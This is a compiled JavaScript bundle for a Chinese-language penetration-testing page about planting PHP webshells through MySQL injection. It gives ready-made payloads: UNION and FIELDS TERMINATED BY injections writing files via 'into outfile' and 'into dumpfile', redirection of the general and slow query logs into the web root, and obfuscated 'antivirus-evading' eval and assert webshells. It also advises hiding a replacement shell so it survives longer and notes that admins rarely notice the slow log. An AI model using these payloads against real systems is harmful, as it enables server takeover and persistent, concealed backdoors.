(window.webpackJsonp=window.webpackJsonp||[]).push([[99],{846:function(s,t,e){"use strict";e.r(t);var a=e(79),n=Object(a.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("p",[t("strong",[s._v("MySQL注入点，用工具对目标站直接写入一句话，需要哪些条件？")])]),s._v(" "),t("p",[s._v("root权限以及网站的绝对路径")]),s._v(" "),t("h2",{attrs:{id:"outfile和dumpfile写shell"}},[s._v("outfile和dumpfile写shell "),t("a",{staticClass:"header-anchor",attrs:{href:"#outfile和dumpfile写shell"}},[s._v("#")])]),s._v(" "),t("h3",{attrs:{id:"利用条件"}},[s._v("利用条件 "),t("a",{staticClass:"header-anchor",attrs:{href:"#利用条件"}},[s._v("#")])]),s._v(" "),t("p",[s._v("过滤了单引号into outfile还能用吗？不能，GPC要off才行，可以测试Hex编码")]),s._v(" "),t("blockquote",[t("ol",[t("li",[s._v("数据库当前用户为root权限；")]),s._v(" "),t("li",[s._v("知道当前网站的绝对路径；")]),s._v(" "),t("li",[t("code",[s._v("PHP")]),s._v("的"),t("code",[s._v("GPC")]),s._v("为 off状态；(魔术引号，GET，POST，Cookie)")]),s._v(" "),t("li",[s._v("写入的那个路径存在写入权限。")])])]),s._v(" "),t("h3",{attrs:{id:"基于union联合查询"}},[t("strong",[s._v("基于UNION联合查询")]),s._v("： "),t("a",{staticClass:"header-anchor",attrs:{href:"#基于union联合查询"}},[s._v("#")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("?id"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" UNION ALL SELECT "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(","),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?php phpinfo();?>'")]),s._v(",3 into outfile "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'C:\\info.php'")]),s._v("%23\n?id"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" UNION ALL SELECT "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(","),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?php phpinfo();?>'")]),s._v(",3 into dumpfile "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'C:\\info.php'")]),s._v("%23\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h3",{attrs:{id:"非联合查询"}},[t("strong",[s._v("非联合查询")]),s._v(" "),t("a",{staticClass:"header-anchor",attrs:{href:"#非联合查询"}},[s._v("#")])]),s._v(" "),t("p",[s._v("当我们无法使用联合查询时，我们可以使用"),t("code",[s._v("fields terminated by")]),s._v("与"),t("code",[s._v("lines terminated by")]),s._v("来写shell")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("?id"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" into outfile "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'C:\\info.php'")]),s._v(" FIELDS TERMINATED BY "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?php phpinfo();?>'")]),s._v("%23\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("代替空格的方法")])]),s._v(" "),t("p",[s._v("+号，"),t("code",[s._v("%0a")]),s._v("、"),t("code",[s._v("%0b")]),s._v("、"),t("code",[s._v("%a0")]),s._v(" 、 /**/ 注释符等")]),s._v(" "),t("h3",{attrs:{id:"outfile和dumpfile的区别"}},[t("code",[s._v("outfile")]),s._v("和"),t("code",[s._v("dumpfile")]),s._v("的区别 "),t("a",{staticClass:"header-anchor",attrs:{href:"#outfile和dumpfile的区别"}},[s._v("#")])]),s._v(" "),t("p",[t("code",[s._v("outfile")]),s._v(":")]),s._v(" "),t("blockquote",[t("p",[s._v("1、 支持多行数据同时导出")]),s._v(" "),t("p",[s._v("2、 使用union联合查询时，要保证两侧查询的列数相同")]),s._v(" "),t("p",[s._v("3、 会在换行符制表符后面追加反斜杠")]),s._v(" "),t("p",[s._v("4、会在末尾追加换行")])]),s._v(" "),t("p",[t("code",[s._v("dumpfile")]),s._v(":")]),s._v(" "),t("blockquote",[t("p",[s._v("1、 每次只能导出一行数据")]),s._v(" "),t("p",[s._v("2、 不会在换行符制表符后面追加反斜杠")]),s._v(" "),t("p",[s._v("3、 不会在末尾追加换行")])]),s._v(" "),t("p",[s._v("因此，我们可以使用"),t("code",[s._v("into dumpfile")]),s._v("这个函数来顺利写入二进制文件;")]),s._v(" "),t("p",[s._v("当然"),t("code",[s._v("into outfile")]),s._v("函数也可以写入二进制文件，只是最终无法生效罢了（追加的反斜杠会使二进制文件无法生效）")]),s._v(" "),t("p",[s._v("如果服务器端本身的查询语句，结果有多行，但是我们又想使用"),t("code",[s._v("dump file")]),s._v("，应该手动添加 limit 限制")]),s._v(" "),t("h2",{attrs:{id:"突破secure-file-priv写shell"}},[s._v("突破"),t("code",[s._v("secure-file-priv")]),s._v("写shell "),t("a",{staticClass:"header-anchor",attrs:{href:"#突破secure-file-priv写shell"}},[s._v("#")])]),s._v(" "),t("p",[t("code",[s._v("MySQL")]),s._v("的"),t("code",[s._v("secure-file-priv")]),s._v("参数是用来限制LOAD DATA, SELECT … "),t("code",[s._v("OUTFILE")]),s._v(", and LOAD_FILE()传到哪个指定目录的。")]),s._v(" "),t("p",[s._v("当"),t("code",[s._v("secure_file_priv")]),s._v("的值没有具体值时，表示不对"),t("code",[s._v("MySQL")]),s._v("的导入|导出做限制，如果是null，表示"),t("code",[s._v("MySQL")]),s._v("不允许导入导出。")]),s._v(" "),t("p",[s._v("而且在"),t("code",[s._v("mysql 5.6.34")]),s._v("版本以后 "),t("code",[s._v("secure_file_priv")]),s._v(" 的值默认为NULL。并且无法用"),t("code",[s._v("SQL")]),s._v("语句对其进行修改。")]),s._v(" "),t("h2",{attrs:{id:"基于日志写shell"}},[t("strong",[s._v("基于日志写shell")]),s._v(" "),t("a",{staticClass:"header-anchor",attrs:{href:"#基于日志写shell"}},[s._v("#")])]),s._v(" "),t("p",[s._v("（ "),t("code",[s._v("outfile")]),s._v("被禁止，或者写入文件被拦截，没写权限 ，有root权限）")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("show")]),s._v(" variables "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("like")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'%general%'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("global")]),s._v(" general_log "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("on")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--开启日志监测，默认关闭(如果一直开文件会很大的)")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("global")]),s._v(" general_log_file "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/var/www/html/info.php'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--设置日志路径")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?php phpinfo();?>'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--执行查询，写入shell")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--结束后，恢复日志路径，关闭日志监测")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--SQL查询免杀shell")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"<?php $sl = create_function('', @$_REQUEST['klion']);$sl();?>\"")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("SELECT")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?>\"")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("---------------")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--慢查询写shell")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("---------------")]),s._v("\n为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("show")]),s._v(" variables "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("like")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'%slow_query_log%'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--查看慢查询信息")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("global")]),s._v(" slow_query_log"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\t\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--启用慢查询日志(默认禁用)")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("global")]),s._v(" slow_query_log_file"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'C:\\\\phpStudy\\\\WWW\\\\shell.php'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--修改日志文件路径")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'<?php @eval($_POST[abc]);?>'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("or")]),s._v(" sleep"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("11")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\t\t\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--写shell")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br")])]),t("h2",{attrs:{id:"慢查询补充"}},[t("strong",[s._v("慢查询补充")]),s._v(" "),t("a",{staticClass:"header-anchor",attrs:{href:"#慢查询补充"}},[s._v("#")])]),s._v(" "),t("p",[s._v("因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。")]),s._v(" "),t("p",[s._v("一般都是通过"),t("code",[s._v("long_query_time")]),s._v("选项来设置这个时间值，时间以秒为单位，可以精确到微秒。")]),s._v(" "),t("p",[s._v("如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("show")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("global")]),s._v(" variables "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("like")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'%long_query_time%'")]),s._v("\t\t"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("--查看服务器默认时间值")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("通常情况下执行"),t("code",[s._v("sql")]),s._v("语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不会引起管理员的察觉")]),s._v(" "),t("p",[s._v("拿到shell后上传一个新的shell，删掉原来shell，新shell做隐藏，这样shell可能还能活的时间长些")]),s._v(" "),t("p",[s._v("像这种东西还是比较适合那些集成环境,比如,"),t("code",[s._v("appserv")]),s._v(","),t("code",[s._v("xampp")]),s._v("...因为权限全部都映射到同一个系统用户上了,如果是win平台,权限通常都比较高")]),s._v(" "),t("p",[t("strong",[s._v("其它方法")]),s._v("：通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，找上传点 "),t("code",[s._v("GetShell")])])])}),[],!1,null,null,null);t.default=n.exports}}]);